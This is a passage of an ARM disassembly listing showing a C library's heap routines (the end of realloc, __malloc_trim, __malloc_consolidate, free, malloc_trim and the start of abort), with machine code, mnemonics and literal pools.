   17d90:	e59f3334 	ldr	r3, [pc, #820]	; 180cc <realloc+0x3b0>
   17d94:	e59d1004 	ldr	r1, [sp, #4]
   17d98:	e791c003 	ldr	ip, [r1, r3]
   17d9c:	e1a0e00f 	mov	lr, pc
   17da0:	e12fff1c 	bx	ip
   17da4:	e3760021 	cmn	r6, #33	; 0x21
   17da8:	9a000006 	bls	17dc8 <realloc+0xac>
   17dac:	e59f231c 	ldr	r2, [pc, #796]	; 180d0 <realloc+0x3b4>
   17db0:	eb000aae 	bl	1a870 <__aeabi_read_tp>
   17db4:	e79f2002 	ldr	r2, [pc, r2]
   17db8:	e3a0300c 	mov	r3, #12
   17dbc:	e3a04000 	mov	r4, #0
   17dc0:	e7803002 	str	r3, [r0, r2]
   17dc4:	ea0000b8 	b	180ac <realloc+0x390>
   17dc8:	e286000b 	add	r0, r6, #11
   17dcc:	e5152004 	ldr	r2, [r5, #-4]
   17dd0:	e350000f 	cmp	r0, #15
   17dd4:	93a09010 	movls	r9, #16
   17dd8:	83c09007 	bichi	r9, r0, #7
   17ddc:	e3120002 	tst	r2, #2
   17de0:	e245a008 	sub	sl, r5, #8
   17de4:	e3c26003 	bic	r6, r2, #3
   17de8:	1a000075 	bne	17fc4 <realloc+0x2a8>
   17dec:	e1560009 	cmp	r6, r9
   17df0:	21a00006 	movcs	r0, r6
   17df4:	2a000058 	bcs	17f5c <realloc+0x240>
   17df8:	e59f32d4 	ldr	r3, [pc, #724]	; 180d4 <realloc+0x3b8>
   17dfc:	e59dc004 	ldr	ip, [sp, #4]
   17e00:	e79c0003 	ldr	r0, [ip, r3]
   17e04:	e590302c 	ldr	r3, [r0, #44]	; 0x2c
   17e08:	e08a4006 	add	r4, sl, r6
   17e0c:	e1540003 	cmp	r4, r3
   17e10:	e5941004 	ldr	r1, [r4, #4]
   17e14:	1a00000e 	bne	17e54 <realloc+0x138>
   17e18:	e3c13003 	bic	r3, r1, #3
   17e1c:	e0831006 	add	r1, r3, r6
   17e20:	e2893010 	add	r3, r9, #16
   17e24:	e1510003 	cmp	r1, r3
   17e28:	3a00001e 	bcc	17ea8 <realloc+0x18c>
   17e2c:	e0693001 	rsb	r3, r9, r1
   17e30:	e2022001 	and	r2, r2, #1
   17e34:	e08a1009 	add	r1, sl, r9
   17e38:	e1892002 	orr	r2, r9, r2
   17e3c:	e3833001 	orr	r3, r3, #1
   17e40:	e1a04005 	mov	r4, r5
   17e44:	e5052004 	str	r2, [r5, #-4]
   17e48:	e580102c 	str	r1, [r0, #44]	; 0x2c
   17e4c:	e5813004 	str	r3, [r1, #4]
   17e50:	ea00008e 	b	18090 <realloc+0x374>
   17e54:	e3c13001 	bic	r3, r1, #1
   17e58:	e0843003 	add	r3, r4, r3
   17e5c:	e5933004 	ldr	r3, [r3, #4]
   17e60:	e3130001 	tst	r3, #1
   17e64:	1a00000f 	bne	17ea8 <realloc+0x18c>
   17e68:	e3c13003 	bic	r3, r1, #3
   17e6c:	e0830006 	add	r0, r3, r6
   17e70:	e1500009 	cmp	r0, r9
   17e74:	3a00000b 	bcc	17ea8 <realloc+0x18c>
   17e78:	e5941008 	ldr	r1, [r4, #8]
   17e7c:	e591300c 	ldr	r3, [r1, #12]
   17e80:	e1530004 	cmp	r3, r4
   17e84:	e594200c 	ldr	r2, [r4, #12]
   17e88:	1a000002 	bne	17e98 <realloc+0x17c>
   17e8c:	e5923008 	ldr	r3, [r2, #8]
   17e90:	e1530004 	cmp	r3, r4
   17e94:	0a000000 	beq	17e9c <realloc+0x180>
   17e98:	eb0001c7 	bl	185bc <__GI_abort>
   17e9c:	e5821008 	str	r1, [r2, #8]
   17ea0:	e581200c 	str	r2, [r1, #12]
   17ea4:	ea00002c 	b	17f5c <realloc+0x240>
   17ea8:	e2490007 	sub	r0, r9, #7
   17eac:	ebfffcfc 	bl	172a4 <malloc>
   17eb0:	e2501000 	subs	r1, r0, #0
   17eb4:	01a04001 	moveq	r4, r1
   17eb8:	0a000074 	beq	18090 <realloc+0x374>
   17ebc:	e5113004 	ldr	r3, [r1, #-4]
   17ec0:	e2417008 	sub	r7, r1, #8
   17ec4:	e1570004 	cmp	r7, r4
   17ec8:	03c33003 	biceq	r3, r3, #3
   17ecc:	00830006 	addeq	r0, r3, r6
   17ed0:	0a000021 	beq	17f5c <realloc+0x240>
   17ed4:	e2462004 	sub	r2, r6, #4
   17ed8:	e1a0c122 	lsr	ip, r2, #2
   17edc:	e35c0009 	cmp	ip, #9
   17ee0:	9a000002 	bls	17ef0 <realloc+0x1d4>
   17ee4:	e1a01005 	mov	r1, r5
   17ee8:	ebfffa70 	bl	168b0 <__GI_memcpy>
   17eec:	ea000016 	b	17f4c <realloc+0x230>
   17ef0:	e5953000 	ldr	r3, [r5]
   17ef4:	e5813000 	str	r3, [r1]
   17ef8:	e5953004 	ldr	r3, [r5, #4]
   17efc:	e5813004 	str	r3, [r1, #4]
   17f00:	e5953008 	ldr	r3, [r5, #8]
   17f04:	e35c0004 	cmp	ip, #4
   17f08:	e5813008 	str	r3, [r1, #8]
   17f0c:	9a00000e 	bls	17f4c <realloc+0x230>
   17f10:	e595300c 	ldr	r3, [r5, #12]
   17f14:	e581300c 	str	r3, [r1, #12]
   17f18:	e5953010 	ldr	r3, [r5, #16]
   17f1c:	e35c0006 	cmp	ip, #6
   17f20:	e5813010 	str	r3, [r1, #16]
   17f24:	9a000008 	bls	17f4c <realloc+0x230>
   17f28:	e5953014 	ldr	r3, [r5, #20]
   17f2c:	e5813014 	str	r3, [r1, #20]
   17f30:	e5953018 	ldr	r3, [r5, #24]
   17f34:	e5813018 	str	r3, [r1, #24]
   17f38:	e35c0009 	cmp	ip, #9
   17f3c:	0595301c 	ldreq	r3, [r5, #28]
   17f40:	0581301c 	streq	r3, [r1, #28]
   17f44:	05953020 	ldreq	r3, [r5, #32]
   17f48:	05813020 	streq	r3, [r1, #32]
   17f4c:	e1a00005 	mov	r0, r5
   17f50:	eb0000fa 	bl	18340 <free>
   17f54:	e2874008 	add	r4, r7, #8
   17f58:	ea00004c 	b	18090 <realloc+0x374>
   17f5c:	e0691000 	rsb	r1, r9, r0
   17f60:	e351000f 	cmp	r1, #15
   17f64:	e59a3004 	ldr	r3, [sl, #4]
   17f68:	8a000007 	bhi	17f8c <realloc+0x270>
   17f6c:	e2033001 	and	r3, r3, #1
   17f70:	e1803003 	orr	r3, r0, r3
   17f74:	e58a3004 	str	r3, [sl, #4]
   17f78:	e08a2000 	add	r2, sl, r0
   17f7c:	e5923004 	ldr	r3, [r2, #4]
   17f80:	e3833001 	orr	r3, r3, #1
   17f84:	e5823004 	str	r3, [r2, #4]
   17f88:	ea00000b 	b	17fbc <realloc+0x2a0>
   17f8c:	e2033001 	and	r3, r3, #1
   17f90:	e08a0009 	add	r0, sl, r9
   17f94:	e1893003 	orr	r3, r9, r3
   17f98:	e3812001 	orr	r2, r1, #1
   17f9c:	e58a3004 	str	r3, [sl, #4]
   17fa0:	e5802004 	str	r2, [r0, #4]
   17fa4:	e0802001 	add	r2, r0, r1
   17fa8:	e5923004 	ldr	r3, [r2, #4]
   17fac:	e3833001 	orr	r3, r3, #1
   17fb0:	e5823004 	str	r3, [r2, #4]
   17fb4:	e2800008 	add	r0, r0, #8
   17fb8:	eb0000e0 	bl	18340 <free>
   17fbc:	e28a4008 	add	r4, sl, #8
   17fc0:	ea000032 	b	18090 <realloc+0x374>
   17fc4:	e59f3108 	ldr	r3, [pc, #264]	; 180d4 <realloc+0x3b8>
   17fc8:	e59d1004 	ldr	r1, [sp, #4]
   17fcc:	e7918003 	ldr	r8, [r1, r3]
   17fd0:	e5154008 	ldr	r4, [r5, #-8]
   17fd4:	e598235c 	ldr	r2, [r8, #860]	; 0x35c
   17fd8:	e2843004 	add	r3, r4, #4
   17fdc:	e2422001 	sub	r2, r2, #1
   17fe0:	e0833002 	add	r3, r3, r2
   17fe4:	e0833009 	add	r3, r3, r9
   17fe8:	e1c37002 	bic	r7, r3, r2
   17fec:	e064b007 	rsb	fp, r4, r7
   17ff0:	e156000b 	cmp	r6, fp
   17ff4:	0a00001a 	beq	18064 <realloc+0x348>
   17ff8:	e064000a 	rsb	r0, r4, sl
   17ffc:	e0861004 	add	r1, r6, r4
   18000:	e1a02007 	mov	r2, r7
   18004:	e3a03001 	mov	r3, #1
   18008:	eb000ace 	bl	1ab48 <__GI_mremap>
   1800c:	e3700001 	cmn	r0, #1
   18010:	0a000010 	beq	18058 <realloc+0x33c>
   18014:	e0800004 	add	r0, r0, r4
   18018:	e38b3002 	orr	r3, fp, #2
   1801c:	e5803004 	str	r3, [r0, #4]
   18020:	e5983364 	ldr	r3, [r8, #868]	; 0x364
   18024:	e5982370 	ldr	r2, [r8, #880]	; 0x370
   18028:	e0663003 	rsb	r3, r6, r3
   1802c:	e0831007 	add	r1, r3, r7
   18030:	e5983368 	ldr	r3, [r8, #872]	; 0x368
   18034:	e1510002 	cmp	r1, r2
   18038:	e5982374 	ldr	r2, [r8, #884]	; 0x374
   1803c:	85881370 	strhi	r1, [r8, #880]	; 0x370
   18040:	e5881364 	str	r1, [r8, #868]	; 0x364
   18044:	e0811003 	add	r1, r1, r3
   18048:	e1510002 	cmp	r1, r2
   1804c:	e2804008 	add	r4, r0, #8
   18050:	85881374 	strhi	r1, [r8, #884]	; 0x374
   18054:	ea00000d 	b	18090 <realloc+0x374>
   18058:	e2893004 	add	r3, r9, #4
   1805c:	e1560003 	cmp	r6, r3
   18060:	3a000001 	bcc	1806c <realloc+0x350>
   18064:	e1a04005 	mov	r4, r5
   18068:	ea000008 	b	18090 <realloc+0x374>
   1806c:	e2490007 	sub	r0, r9, #7
   18070:	ebfffc8b 	bl	172a4 <malloc>
   18074:	e2504000 	subs	r4, r0, #0
   18078:	0a000004 	beq	18090 <realloc+0x374>
   1807c:	e2462008 	sub	r2, r6, #8
   18080:	e1a01005 	mov	r1, r5
   18084:	ebfffa09 	bl	168b0 <__GI_memcpy>
   18088:	e1a00005 	mov	r0, r5
   1808c:	eb0000ab 	bl	18340 <free>
   18090:	e28d0008 	add	r0, sp, #8
   18094:	e3a01001 	mov	r1, #1
   18098:	e59f3038 	ldr	r3, [pc, #56]	; 180d8 <realloc+0x3bc>
   1809c:	e59d2004 	ldr	r2, [sp, #4]
   180a0:	e792c003 	ldr	ip, [r2, r3]
   180a4:	e1a0e00f 	mov	lr, pc
   180a8:	e12fff1c 	bx	ip
   180ac:	e1a00004 	mov	r0, r4
   180b0:	e28dd01c 	add	sp, sp, #28
   180b4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   180b8:	e12fff1e 	bx	lr
   180bc:	00010c60 	.word	0x00010c60
   180c0:	0000006c 	.word	0x0000006c
   180c4:	00000044 	.word	0x00000044
   180c8:	00000070 	.word	0x00000070
   180cc:	00000010 	.word	0x00000010
   180d0:	00010c30 	.word	0x00010c30
   180d4:	00000040 	.word	0x00000040
   180d8:	0000002c 	.word	0x0000002c

000180dc <__malloc_trim>:
   180dc:	e591302c 	ldr	r3, [r1, #44]	; 0x2c
   180e0:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   180e4:	e5933004 	ldr	r3, [r3, #4]
   180e8:	e591435c 	ldr	r4, [r1, #860]	; 0x35c
   180ec:	e3c36003 	bic	r6, r3, #3
   180f0:	e2443011 	sub	r3, r4, #17
   180f4:	e0833006 	add	r3, r3, r6
   180f8:	e24dd004 	sub	sp, sp, #4
   180fc:	e1a05001 	mov	r5, r1
   18100:	e0600003 	rsb	r0, r0, r3
   18104:	e1a01004 	mov	r1, r4
   18108:	ebfff6e8 	bl	15cb0 <__udivsi3>
   1810c:	e2400001 	sub	r0, r0, #1
   18110:	e0070094 	mul	r7, r4, r0
   18114:	e3570000 	cmp	r7, #0
   18118:	da000017 	ble	1817c <__malloc_trim+0xa0>
   1811c:	e3a00000 	mov	r0, #0
   18120:	eb000ad1 	bl	1ac6c <__GI_sbrk>
   18124:	e595302c 	ldr	r3, [r5, #44]	; 0x2c
   18128:	e0863003 	add	r3, r6, r3
   1812c:	e1500003 	cmp	r0, r3
   18130:	e1a04000 	mov	r4, r0
   18134:	1a000010 	bne	1817c <__malloc_trim+0xa0>
   18138:	e2670000 	rsb	r0, r7, #0
   1813c:	eb000aca 	bl	1ac6c <__GI_sbrk>
   18140:	e3a00000 	mov	r0, #0
   18144:	eb000ac8 	bl	1ac6c <__GI_sbrk>
   18148:	e3700001 	cmn	r0, #1
   1814c:	0a00000a 	beq	1817c <__malloc_trim+0xa0>
   18150:	e0540000 	subs	r0, r4, r0
   18154:	0a000008 	beq	1817c <__malloc_trim+0xa0>
   18158:	e5953368 	ldr	r3, [r5, #872]	; 0x368
   1815c:	e0602006 	rsb	r2, r0, r6
   18160:	e595102c 	ldr	r1, [r5, #44]	; 0x2c
   18164:	e0603003 	rsb	r3, r0, r3
   18168:	e3822001 	orr	r2, r2, #1
   1816c:	e3a00001 	mov	r0, #1
   18170:	e5853368 	str	r3, [r5, #872]	; 0x368
   18174:	e5812004 	str	r2, [r1, #4]
   18178:	ea000000 	b	18180 <__malloc_trim+0xa4>
   1817c:	e3a00000 	mov	r0, #0
   18180:	e28dd004 	add	sp, sp, #4
   18184:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   18188:	e12fff1e 	bx	lr

0001818c <__malloc_consolidate>:
   1818c:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   18190:	e5903000 	ldr	r3, [r0]
   18194:	e3530000 	cmp	r3, #0
   18198:	e24dd004 	sub	sp, sp, #4
   1819c:	e1a04000 	mov	r4, r0
   181a0:	03a02001 	moveq	r2, #1
   181a4:	0a000048 	beq	182cc <__malloc_consolidate+0x140>
   181a8:	e3c33002 	bic	r3, r3, #2
   181ac:	e1a021a3 	lsr	r2, r3, #3
   181b0:	e5803000 	str	r3, [r0]
   181b4:	e2403004 	sub	r3, r0, #4
   181b8:	e0839102 	add	r9, r3, r2, lsl #2
   181bc:	e2807034 	add	r7, r0, #52	; 0x34
   181c0:	e2806004 	add	r6, r0, #4
   181c4:	e3a0b000 	mov	fp, #0
   181c8:	e5961000 	ldr	r1, [r6]
   181cc:	e3510000 	cmp	r1, #0
   181d0:	0a000039 	beq	182bc <__malloc_consolidate+0x130>
   181d4:	e586b000 	str	fp, [r6]
   181d8:	e5913004 	ldr	r3, [r1, #4]
   181dc:	e3c3e001 	bic	lr, r3, #1
   181e0:	e081000e 	add	r0, r1, lr
   181e4:	e3130001 	tst	r3, #1
   181e8:	e591a008 	ldr	sl, [r1, #8]
   181ec:	e5908004 	ldr	r8, [r0, #4]
   181f0:	1a00000c 	bne	18228 <__malloc_consolidate+0x9c>
   181f4:	e5915000 	ldr	r5, [r1]
   181f8:	e0653001 	rsb	r3, r5, r1
   181fc:	e593c008 	ldr	ip, [r3, #8]
   18200:	e59c100c 	ldr	r1, [ip, #12]
   18204:	e1510003 	cmp	r1, r3
   18208:	e593200c 	ldr	r2, [r3, #12]
   1820c:	1a000016 	bne	1826c <__malloc_consolidate+0xe0>
   18210:	e5923008 	ldr	r3, [r2, #8]
   18214:	e1530001 	cmp	r3, r1
   18218:	1a000013 	bne	1826c <__malloc_consolidate+0xe0>
   1821c:	e582c008 	str	ip, [r2, #8]
   18220:	e58c200c 	str	r2, [ip, #12]
   18224:	e08ee005 	add	lr, lr, r5
   18228:	e594302c 	ldr	r3, [r4, #44]	; 0x2c
   1822c:	e1500003 	cmp	r0, r3
   18230:	e3c85003 	bic	r5, r8, #3
   18234:	0a000019 	beq	182a0 <__malloc_consolidate+0x114>
   18238:	e0803005 	add	r3, r0, r5
   1823c:	e5933004 	ldr	r3, [r3, #4]
   18240:	e3130001 	tst	r3, #1
   18244:	e5805004 	str	r5, [r0, #4]
   18248:	1a00000b 	bne	1827c <__malloc_consolidate+0xf0>
   1824c:	e590c008 	ldr	ip, [r0, #8]
   18250:	e59c300c 	ldr	r3, [ip, #12]
   18254:	e1530000 	cmp	r3, r0
   18258:	e590200c 	ldr	r2, [r0, #12]
   1825c:	1a000002 	bne	1826c <__malloc_consolidate+0xe0>
   18260:	e5923008 	ldr	r3, [r2, #8]
   18264:	e1530000 	cmp	r3, r0
   18268:	0a000000 	beq	18270 <__malloc_consolidate+0xe4>
   1826c:	eb0000d2 	bl	185bc <__GI_abort>
   18270:	e582c008 	str	ip, [r2, #8]
   18274:	e58c200c 	str	r2, [ip, #12]
   18278:	e08ee005 	add	lr, lr, r5
   1827c:	e5972008 	ldr	r2, [r7, #8]
   18280:	e38e3001 	orr	r3, lr, #1
   18284:	e5871008 	str	r1, [r7, #8]
   18288:	e582100c 	str	r1, [r2, #12]
   1828c:	e781e00e 	str	lr, [r1, lr]
   18290:	e5813004 	str	r3, [r1, #4]
   18294:	e5812008 	str	r2, [r1, #8]
   18298:	e581700c 	str	r7, [r1, #12]
   1829c:	ea000003 	b	182b0 <__malloc_consolidate+0x124>
   182a0:	e08e3005 	add	r3, lr, r5
   182a4:	e3833001 	orr	r3, r3, #1
   182a8:	e5813004 	str	r3, [r1, #4]
   182ac:	e584102c 	str	r1, [r4, #44]	; 0x2c
   182b0:	e35a0000 	cmp	sl, #0
   182b4:	e1a0100a 	mov	r1, sl
   182b8:	1affffc6 	bne	181d8 <__malloc_consolidate+0x4c>
   182bc:	e1560009 	cmp	r6, r9
   182c0:	0a00001b 	beq	18334 <__malloc_consolidate+0x1a8>
   182c4:	e2866004 	add	r6, r6, #4
   182c8:	eaffffbe 	b	181c8 <__malloc_consolidate+0x3c>
   182cc:	e0843182 	add	r3, r4, r2, lsl #3
   182d0:	e2822001 	add	r2, r2, #1
   182d4:	e283302c 	add	r3, r3, #44	; 0x2c
   182d8:	e352005f 	cmp	r2, #95	; 0x5f
   182dc:	e5833008 	str	r3, [r3, #8]
   182e0:	e583300c 	str	r3, [r3, #12]
   182e4:	dafffff8 	ble	182cc <__malloc_consolidate+0x140>
   182e8:	e5942000 	ldr	r2, [r4]
   182ec:	e5941360 	ldr	r1, [r4, #864]	; 0x360
   182f0:	e3a03000 	mov	r3, #0
   182f4:	e2022003 	and	r2, r2, #3
   182f8:	e3a00701 	mov	r0, #262144	; 0x40000
   182fc:	e3811001 	orr	r1, r1, #1
   18300:	e3822048 	orr	r2, r2, #72	; 0x48
   18304:	e284c034 	add	ip, r4, #52	; 0x34
   18308:	e5843348 	str	r3, [r4, #840]	; 0x348
   1830c:	e2833801 	add	r3, r3, #65536	; 0x10000
   18310:	e5840344 	str	r0, [r4, #836]	; 0x344
   18314:	e584034c 	str	r0, [r4, #844]	; 0x34c
   18318:	e5843354 	str	r3, [r4, #852]	; 0x354
   1831c:	e5841360 	str	r1, [r4, #864]	; 0x360
   18320:	e5842000 	str	r2, [r4]
   18324:	e584c02c 	str	ip, [r4, #44]	; 0x2c
   18328:	e3a0001e 	mov	r0, #30
   1832c:	eb00037e 	bl	1912c <__GI_sysconf>
   18330:	e584035c 	str	r0, [r4, #860]	; 0x35c
   18334:	e28dd004 	add	sp, sp, #4
   18338:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   1833c:	e12fff1e 	bx	lr

00018340 <free>:
   18340:	e92d41f0 	push	{r4, r5, r6, r7, r8, lr}
   18344:	e59f7214 	ldr	r7, [pc, #532]	; 18560 <free+0x220>
   18348:	e2506000 	subs	r6, r0, #0
   1834c:	e24dd010 	sub	sp, sp, #16
   18350:	e08f7007 	add	r7, pc, r7
   18354:	0a00007e 	beq	18554 <free+0x214>
   18358:	e59f3204 	ldr	r3, [pc, #516]	; 18564 <free+0x224>
   1835c:	e7974003 	ldr	r4, [r7, r3]
   18360:	e59f3200 	ldr	r3, [pc, #512]	; 18568 <free+0x228>
   18364:	e1a02004 	mov	r2, r4
   18368:	e7971003 	ldr	r1, [r7, r3]
   1836c:	e1a0000d 	mov	r0, sp
   18370:	e59f31f4 	ldr	r3, [pc, #500]	; 1856c <free+0x22c>
   18374:	e797c003 	ldr	ip, [r7, r3]
   18378:	e1a0e00f 	mov	lr, pc
   1837c:	e12fff1c 	bx	ip
   18380:	e1a00004 	mov	r0, r4
   18384:	e59f31e4 	ldr	r3, [pc, #484]	; 18570 <free+0x230>
   18388:	e797c003 	ldr	ip, [r7, r3]
   1838c:	e1a0e00f 	mov	lr, pc
   18390:	e12fff1c 	bx	ip
   18394:	e59f31d8 	ldr	r3, [pc, #472]	; 18574 <free+0x234>
   18398:	e797e003 	ldr	lr, [r7, r3]
   1839c:	e5162004 	ldr	r2, [r6, #-4]
   183a0:	e59e3000 	ldr	r3, [lr]
   183a4:	e3c2c003 	bic	ip, r2, #3
   183a8:	e2465008 	sub	r5, r6, #8
   183ac:	e15c0003 	cmp	ip, r3
   183b0:	e1a04005 	mov	r4, r5
   183b4:	8a000007 	bhi	183d8 <free+0x98>
   183b8:	e3833003 	orr	r3, r3, #3
   183bc:	e40e3008 	str	r3, [lr], #-8
   183c0:	e1a011ac 	lsr	r1, ip, #3
   183c4:	e28e2004 	add	r2, lr, #4
   183c8:	e7923101 	ldr	r3, [r2, r1, lsl #2]
   183cc:	e5853008 	str	r3, [r5, #8]
   183d0:	e7825101 	str	r5, [r2, r1, lsl #2]
   183d4:	ea000058 	b	1853c <free+0x1fc>
   183d8:	e3120002 	tst	r2, #2
   183dc:	1a00004c 	bne	18514 <free+0x1d4>
   183e0:	e3833001 	orr	r3, r3, #1
   183e4:	e58e3000 	str	r3, [lr]
   183e8:	e5163004 	ldr	r3, [r6, #-4]
   183ec:	e085e00c 	add	lr, r5, ip
   183f0:	e3130001 	tst	r3, #1
   183f4:	e59e8004 	ldr	r8, [lr, #4]
   183f8:	1a00000c 	bne	18430 <free+0xf0>
   183fc:	e5161008 	ldr	r1, [r6, #-8]
   18400:	e0613005 	rsb	r3, r1, r5
   18404:	e5932008 	ldr	r2, [r3, #8]
   18408:	e592400c 	ldr	r4, [r2, #12]
   1840c:	e1540003 	cmp	r4, r3
   18410:	e593000c 	ldr	r0, [r3, #12]
   18414:	1a000018 	bne	1847c <free+0x13c>
   18418:	e5903008 	ldr	r3, [r0, #8]
   1841c:	e1530004 	cmp	r3, r4
   18420:	1a000015 	bne	1847c <free+0x13c>
   18424:	e5802008 	str	r2, [r0, #8]
   18428:	e582000c 	str	r0, [r2, #12]
   1842c:	e08cc001 	add	ip, ip, r1
   18430:	e59f313c 	ldr	r3, [pc, #316]	; 18574 <free+0x234>
   18434:	e7972003 	ldr	r2, [r7, r3]
   18438:	e592302c 	ldr	r3, [r2, #44]	; 0x2c
   1843c:	e15e0003 	cmp	lr, r3
   18440:	e3c80003 	bic	r0, r8, #3
   18444:	0a00001c 	beq	184bc <free+0x17c>
   18448:	e08e3000 	add	r3, lr, r0
   1844c:	e5933004 	ldr	r3, [r3, #4]
   18450:	e3130001 	tst	r3, #1
   18454:	e58e0004 	str	r0, [lr, #4]
   18458:	1a00000b 	bne	1848c <free+0x14c>
   1845c:	e59e1008 	ldr	r1, [lr, #8]
   18460:	e591300c 	ldr	r3, [r1, #12]
   18464:	e153000e 	cmp	r3, lr
   18468:	e59e200c 	ldr	r2, [lr, #12]
   1846c:	1a000002 	bne	1847c <free+0x13c>
   18470:	e5923008 	ldr	r3, [r2, #8]
   18474:	e153000e 	cmp	r3, lr
   18478:	0a000000 	beq	18480 <free+0x140>
   1847c:	eb00004e 	bl	185bc <__GI_abort>
   18480:	e5821008 	str	r1, [r2, #8]
   18484:	e581200c 	str	r2, [r1, #12]
   18488:	e08cc000 	add	ip, ip, r0
   1848c:	e59f30e0 	ldr	r3, [pc, #224]	; 18574 <free+0x234>
   18490:	e7973003 	ldr	r3, [r7, r3]
   18494:	e2833034 	add	r3, r3, #52	; 0x34
   18498:	e5931008 	ldr	r1, [r3, #8]
   1849c:	e38c2001 	orr	r2, ip, #1
   184a0:	e584300c 	str	r3, [r4, #12]
   184a4:	e5841008 	str	r1, [r4, #8]
   184a8:	e5842004 	str	r2, [r4, #4]
   184ac:	e784c00c 	str	ip, [r4, ip]
   184b0:	e581400c 	str	r4, [r1, #12]
   184b4:	e5834008 	str	r4, [r3, #8]
   184b8:	ea000003 	b	184cc <free+0x18c>
   184bc:	e08cc000 	add	ip, ip, r0
   184c0:	e38c3001 	orr	r3, ip, #1
   184c4:	e582402c 	str	r4, [r2, #44]	; 0x2c
   184c8:	e5843004 	str	r3, [r4, #4]
   184cc:	e35c0802 	cmp	ip, #131072	; 0x20000
   184d0:	3a000019 	bcc	1853c <free+0x1fc>
   184d4:	e59f3098 	ldr	r3, [pc, #152]	; 18574 <free+0x234>
   184d8:	e7974003 	ldr	r4, [r7, r3]
   184dc:	e5943000 	ldr	r3, [r4]
   184e0:	e3130002 	tst	r3, #2
   184e4:	11a00004 	movne	r0, r4
   184e8:	1bffff27 	blne	1818c <__malloc_consolidate>
   184ec:	e594302c 	ldr	r3, [r4, #44]	; 0x2c
   184f0:	e5933004 	ldr	r3, [r3, #4]
   184f4:	e5942344 	ldr	r2, [r4, #836]	; 0x344
   184f8:	e3c33003 	bic	r3, r3, #3
   184fc:	e1530002 	cmp	r3, r2
   18500:	3a00000d 	bcc	1853c <free+0x1fc>
   18504:	e1a01004 	mov	r1, r4
   18508:	e5940348 	ldr	r0, [r4, #840]	; 0x348
   1850c:	ebfffef2 	bl	180dc <__malloc_trim>
   18510:	ea000009 	b	1853c <free+0x1fc>
   18514:	e5160008 	ldr	r0, [r6, #-8]
   18518:	e59e2350 	ldr	r2, [lr, #848]	; 0x350
   1851c:	e59e3364 	ldr	r3, [lr, #868]	; 0x364
   18520:	e08c1000 	add	r1, ip, r0
   18524:	e2422001 	sub	r2, r2, #1
   18528:	e0613003 	rsb	r3, r1, r3
   1852c:	e58e3364 	str	r3, [lr, #868]	; 0x364
   18530:	e58e2350 	str	r2, [lr, #848]	; 0x350
   18534:	e0600005 	rsb	r0, r0, r5
   18538:	eb000993 	bl	1ab8c <__GI_munmap>
   1853c:	e1a0000d 	mov	r0, sp
   18540:	e3a01001 	mov	r1, #1
   18544:	e59f302c 	ldr	r3, [pc, #44]	; 18578 <free+0x238>
   18548:	e797c003 	ldr	ip, [r7, r3]
   1854c:	e1a0e00f 	mov	lr, pc
   18550:	e12fff1c 	bx	ip
   18554:	e28dd010 	add	sp, sp, #16
   18558:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   1855c:	e12fff1e 	bx	lr
   18560:	0001063c 	.word	0x0001063c
   18564:	0000006c 	.word	0x0000006c
   18568:	00000044 	.word	0x00000044
   1856c:	00000070 	.word	0x00000070
   18570:	00000010 	.word	0x00000010
   18574:	00000040 	.word	0x00000040
   18578:	0000002c 	.word	0x0000002c

0001857c <malloc_trim>:
   1857c:	e92d4030 	push	{r4, r5, lr}
   18580:	e59f302c 	ldr	r3, [pc, #44]	; 185b4 <malloc_trim+0x38>
   18584:	e59f202c 	ldr	r2, [pc, #44]	; 185b8 <malloc_trim+0x3c>
   18588:	e08f3003 	add	r3, pc, r3
   1858c:	e7935002 	ldr	r5, [r3, r2]
   18590:	e1a04000 	mov	r4, r0
   18594:	e24dd004 	sub	sp, sp, #4
   18598:	e1a00005 	mov	r0, r5
   1859c:	ebfffefa 	bl	1818c <__malloc_consolidate>
   185a0:	e1a00004 	mov	r0, r4
   185a4:	e1a01005 	mov	r1, r5
   185a8:	e28dd004 	add	sp, sp, #4
   185ac:	e8bd4030 	pop	{r4, r5, lr}
   185b0:	eafffec9 	b	180dc <__malloc_trim>
   185b4:	00010404 	.word	0x00010404
   185b8:	00000040 	.word	0x00000040

000185bc <__GI_abort>:
   185bc:	e59f510c 	ldr	r5, [pc, #268]	; 186d0 <__GI_abort+0x114>
   185c0:	e59f010c 	ldr	r0, [pc, #268]	; 186d4 <__GI_abort+0x118>
   185c4:	e08f5005 	add	r5, pc, r5
   185c8:	e24dd020 	sub	sp, sp, #32
   185cc:	e59f3104 	ldr	r3, [pc, #260]	; 186d8 <__GI_abort+0x11c>
   185d0:	e0850000 	add	r0, r5, r0
   185d4:	e795c003 	ldr	ip, [r5, r3]
   185d8:	e1a0e00f 	mov	lr, pc
   185dc:	e12fff1c 	bx	ip
   185e0:	e3a0c000 	mov	ip, #0
   185e4:	e3a03020 	mov	r3, #32
   185e8:	e1a0200c 	mov	r2, ip
   185ec:	e3a00001 	mov	r0, #1
   185f0:	e28d1018 	add	r1, sp, #24
   185f4:	e58d3018 	str	r3, [sp, #24]
   185f8:	e58dc01c 	str	ip, [sp, #28]
   185fc:	ebfff757 	bl	16360 <__GI_sigprocmask>
   18600:	e59f20d4 	ldr	r2, [pc, #212]	; 186dc <__GI_abort+0x120>
   18604:	e7953002 	ldr	r3, [r5, r2]
   18608:	e3530000 	cmp	r3, #0
   1860c:	1a00000f 	bne	18650 <__GI_abort+0x94>
   18610:	e2833001 	add	r3, r3, #1
   18614:	e7853002 	str	r3, [r5, r2]
   18618:	e59f40b4 	ldr	r4, [pc, #180]	; 186d4 <__GI_abort+0x118>
   1861c:	e0854004 	add	r4, r5, r4
   18620:	e59f30b8 	ldr	r3, [pc, #184]	; 186e0 <__GI_abort+0x124>
   18624:	e1a00004 	mov	r0, r4
   18628:	e795c003 	ldr	ip, [r5, r3]
   1862c:	e1a0e00f 	mov	lr, pc
   18630:	e12fff1c 	bx	ip
   18634:	e3a00006 	mov	r0, #6
   18638:	eb00056f 	bl	19bfc <__GI_raise>
   1863c:	e1a00004 	mov	r0, r4
   18640:	e59f3090 	ldr	r3, [pc, #144]	; 186d8 <__GI_abort+0x11c>
   18644:	e795c003 	ldr	ip, [r5, r3]
   18648:	e1a0e00f 	mov	lr, pc
   1864c:	e12fff1c 	bx	ip
